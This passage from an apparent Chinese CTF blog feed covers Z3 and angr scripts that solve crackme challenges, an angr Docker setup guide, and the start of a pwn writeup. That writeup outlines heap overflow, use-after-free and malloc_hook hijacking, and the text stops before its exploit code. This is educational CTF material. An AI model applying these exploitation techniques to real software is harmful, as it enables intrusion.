class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xA1</span>,<span class="number">0xC7</span>,<span class="number">0x04</span>,<span class="number">0x2B</span>,<span class="number">0xC2</span>,</span><br><span class="line"><span class="number">0x9D</span>,<span class="number">0x3F</span>,<span class="number">0xA7</span>,<span class="number">0x6C</span>,<span class="number">0xE7</span>,<span class="number">0xD0</span>,<span class="number">0x90</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0xB3</span>,<span class="number">0xAB</span>,<span class="number">0x67</span>,<span class="number">0xBF</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x6D</span>,<span class="number">0x35</span>,<span class="number">0xC8</span>,<span class="number">0x55</span>,<span class="number">0xFF</span>,<span class="number">0xC0</span>,<span class="number">0x95</span>,<span class="number">0x62</span>,<span class="number">0xE6</span>,<span class="number">0xBB</span>,<span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x29</span>,<span class="number">0x0E</span>,<span class="number">3</span>]</span><br><span class="line">xor_result = [<span class="number">0</span>]*<span class="number">0x41</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        xor_result[n+m] += X[m] ^ data1[n]</span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x41</span>):          <span class="comment">#循环添加约束条件</span></span><br><span class="line">    s.add(xor_result[o] == data2[o])   </span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    flag+=chr(int(<span class="string">"%s"</span> % (m[X[i]])))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p><p>执行脚本如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python exp2.py </span><br><span class="line">[x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33]</span><br><span class="line">sat</span><br><span class="line">traversing model...</span><br><span class="line">SYC&#123;4+mile+b3gin+with+sing1e+step&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>angr符号执行</title>
    <link href="https://nocbtm.github.io/2019/10/02/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>https://nocbtm.github.io/2019/10/02/angr符号执行/</id>
    <published>2019-10-02T09:20:42.000Z</published>
    <updated>2019-10-02T10:43:48.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多，<a href="http://angr.io/api-doc/claripy.html" target="_blank" rel="noopener">官方学习文档</a>。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里不建议实体机安装，坑太多，直接上docker，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="r100-defcamp"><a href="#r100-defcamp" class="headerlink" title="r100(defcamp)"></a>r100(defcamp)</h3><p>题目和脚本docker里面都有,将程序载入IDA静态分析，主函数如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006FD((__int64)&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Incorrect password!"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nice!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">"Dufhbmf"</span>;</span><br><span class="line">  v4 = <span class="string">"pG`imos"</span>;</span><br><span class="line">  v5 = <span class="string">"ewUglpt"</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v3)[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] - *(<span class="keyword">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做。先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = angr.Project(<span class="string">"r100"</span>, load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="keyword">False</span>&#125;) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment">#约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址</span></span><br><span class="line">    ex = p.surveyors.Explorer(find=(<span class="number">0x400844</span>, ), avoid=(<span class="number">0x400855</span>,)) </span><br><span class="line">    ex.run() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ex.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">'\0\n'</span>) <span class="comment"># 打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> main() == <span class="string">'Code_Talkers'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> main()</span><br></pre></td></tr></table></figure></p><h3 id="crackme-ais3"><a href="#crackme-ais3" class="headerlink" title="crackme(ais3)"></a>crackme(ais3)</h3><p>同样载入IDA看主函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)verify((__int64)argv[<span class="number">1</span>]) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Correct! that is the secret key!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"I'm sorry, that's the wrong secret key!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need to enter the secret key!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">verify</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( encrypted[i] != ((<span class="keyword">unsigned</span> __int8)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)) | (<span class="keyword">unsigned</span> __int8)((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>))))</span><br><span class="line">                       + <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i == <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>符号执行脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy  <span class="comment">#处理用户输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    project = angr.Project(<span class="string">"./ais3_crackme"</span>)</span><br><span class="line"></span><br><span class="line">    argv1 = claripy.BVS(<span class="string">"argv1"</span>,<span class="number">100</span>*<span class="number">8</span>) <span class="comment">#猜测flag长度小于100,乘8是转换为字节</span></span><br><span class="line">    initial_state = project.factory.entry_state(args=[<span class="string">"./crackme1"</span>,argv1]) <span class="comment"># 传递参数</span></span><br><span class="line"></span><br><span class="line">    sm = project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#象征性地执行程序，直到达到指令指针的要求值</span></span><br><span class="line">    sm.explore(find=<span class="number">0x400602</span>) <span class="comment">#在这个指令程序将打印“正确的”消息</span></span><br><span class="line"></span><br><span class="line">    found = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#请求符号解算程序以字符串的形式获取处于到达状态的argv1的值</span></span><br><span class="line">    solution = found.solver.eval(argv1, cast_to=str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(solution)</span><br><span class="line">    solution = solution[:solution.find(<span class="string">"\x00"</span>)]</span><br><span class="line">    <span class="keyword">print</span> solution</span><br><span class="line">    <span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    res = main()</span><br><span class="line">    <span class="keyword">assert</span> res == <span class="string">"ais3&#123;I_tak3_g00d_n0t3s&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(repr(main()))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>docker安装angr</title>
    <link href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/"/>
    <id>https://nocbtm.github.io/2019/10/02/docker安装angr/</id>
    <published>2019-10-02T07:48:56.000Z</published>
    <updated>2019-10-03T04:24:29.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环境为ubuntu16.64。</p><h2 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h2><p>申请<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云</a>，修改daemon配置文件/etc/docker/daemon.json来使用加速器，把下方的registry-mirrors换成你的加速器地址。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [<span class="string">"https://culfukli.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure></p><h2 id="安装angr"><a href="#安装angr" class="headerlink" title="安装angr"></a>安装angr</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure><p>安装完执行docker images 查看镜像，运行angr<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br></pre></td></tr></table></figure></p><p>上述命令可以执行angr，但不会保存你在其中做的修改，应该用下列命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> run -itd registry.cn-hangzhou.aliyuncs.com/liujunjie/angr</span><br><span class="line">1d443841326281a8c5aee9cfad74893a5eded421eadc3eac2222f91bf15e3eb9</span><br><span class="line"><span class="variable">$docker</span> <span class="built_in">exec</span> -it 1d44 bash     <span class="comment">#1d44为你的id的前四位</span></span><br><span class="line">root@1d4438413262:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   media  opt  root  sbin  sys  usr</span><br></pre></td></tr></table></figure></p><p>这时可以输入命令了，与在linux中操作一样。<br>但在root用户下import angr会失败，用su angr命令切换到angr用户即可。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>进入到有例子的目录下，执行脚本,可以看到flag。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> /home/angr/angr-dev/angr-doc/examples/ais3_crackme</span><br><span class="line"><span class="variable">$ls</span></span><br><span class="line">ais3_crackme  solve.py</span><br><span class="line"><span class="variable">$python</span> solve.py </span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">ais3&#123;I_tak3_g00d_n0t3s&#125;</span><br><span class="line"><span class="string">'ais3&#123;I_tak3_g00d_n0t3s&#125;'</span></span><br></pre></td></tr></table></figure></p><h2 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h2><p>主机向docker中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (本地文件路径) (docker container id):(容器中路径)</span><br></pre></td></tr></table></figure></p><p>docker向主机中拷贝：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp (docker container id):(容器中路径) (本地文件路径)</span><br></pre></td></tr></table></figure></p><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><h3 id="查看容器进程"><a href="#查看容器进程" class="headerlink" title="查看容器进程"></a>查看容器进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h3 id="打开容器"><a href="#打开容器" class="headerlink" title="打开容器"></a>打开容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start container_id</span><br></pre></td></tr></table></figure><h3 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dockr stop container_id</span><br></pre></td></tr></table></figure><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id</span><br></pre></td></tr></table></figure><h3 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">export</span> container_id &gt; 容器快照名</span><br></pre></td></tr></table></figure><h2 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名称</span><br></pre></td></tr></table></figure><h3 id="运行images"><a href="#运行images" class="headerlink" title="运行images"></a>运行images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it 镜像名称 bash</span><br></pre></td></tr></table></figure><h3 id="删除images"><a href="#删除images" class="headerlink" title="删除images"></a>删除images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;angr不建议在实体机上安装，所以就安装到docker里面，官方容器里已经集成了angr，但安装的太慢。这里我选择了阿里云的容器镜像，本地环
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>学习pwn的心理路程</title>
    <link href="https://nocbtm.github.io/2019/10/02/%E5%AD%A6%E4%B9%A0pwn%E7%9A%84%E5%BF%83%E7%90%86%E8%B7%AF%E7%A8%8B/"/>
    <id>https://nocbtm.github.io/2019/10/02/学习pwn的心理路程/</id>
    <published>2019-10-02T04:21:32.000Z</published>
    <updated>2019-10-02T10:57:24.281Z</updated>
    
    <content type="html"><![CDATA[<p>(o≖◡≖)<br>(๑•̀ㅂ•́)و✧<br>(*￣ω￣)<br>w(ﾟДﾟ)w<br>o(≧口≦)o<br>Σ( ° △ °|||)︴    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;(o≖◡≖)&lt;br&gt;(๑•̀ㅂ•́)و✧&lt;br&gt;(*￣ω￣)&lt;br&gt;w(ﾟДﾟ)w&lt;br&gt;o(≧口≦)o&lt;br&gt;Σ( ° △ °|||)︴    &lt;/p&gt;

      
    
    </summary>
    
      <category term="随笔" scheme="https://nocbtm.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数字经济 pwn fkroman writeup</title>
    <link href="https://nocbtm.github.io/2019/09/28/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20fkroman%20writeup/"/>
    <id>https://nocbtm.github.io/2019/09/28/数字经济 pwn fkroman writeup/</id>
    <published>2019-09-28T09:20:42.000Z</published>
    <updated>2019-10-04T06:16:27.709Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址</li><li>再用uaf漏洞劫持malloc_hook为one_gadget</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地环境：ubuntu 16.04，成功率不高<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 